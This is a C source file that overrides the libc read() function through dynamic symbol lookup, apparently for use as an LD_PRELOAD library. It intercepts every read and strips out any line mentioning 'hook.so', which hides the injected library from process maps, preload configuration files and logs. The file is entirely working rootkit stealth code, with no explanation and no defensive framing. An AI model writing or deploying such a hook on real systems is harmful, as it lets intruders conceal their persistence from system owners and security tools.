#define _GNU_SOURCE
#include <dlfcn.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <stdlib.h>

ssize_t read(int fd, void *buf, size_t count) {
    static ssize_t (*real_read)(int, void *, size_t) = NULL;

    if (!real_read) {
        real_read = dlsym(RTLD_NEXT, "read");
        if (!real_read) {
            errno = ENOSYS;
            return -1;
        }
    }

    ssize_t result = real_read(fd, buf, count);

    if (result > 0) {
        char *start = (char *)buf;
        char *end = start + result;
        char *current = start;

        size_t new_buf_size = result;
        char *new_buf = (char *)malloc(new_buf_size);
        if (!new_buf) {
            errno = ENOMEM;
            return -1;
        }

        size_t new_buf_pos = 0;

        while (current < end) {
            char *line_start = current;
            char *line_end = memchr(current, '\n', end - current);
            if (!line_end) {
                line_end = end;
            } else {
                line_end++;
            }

            if (!memmem(line_start, line_end - line_start, "hook.so", strlen("hook.so"))) {
                size_t line_length = line_end - line_start;
                if (new_buf_pos + line_length > new_buf_size) {
                    new_buf_size = new_buf_pos + line_length;
                    new_buf = (char *)realloc(new_buf, new_buf_size);
                    if (!new_buf) {
                        errno = ENOMEM;
                        return -1;
                    }
                }
                memcpy(new_buf + new_buf_pos, line_start, line_length);
                new_buf_pos += line_length;
            }

            current = line_end;
        }

        memcpy(buf, new_buf, new_buf_pos);
        result = new_buf_pos;

        free(new_buf);
    }

    return result;
}
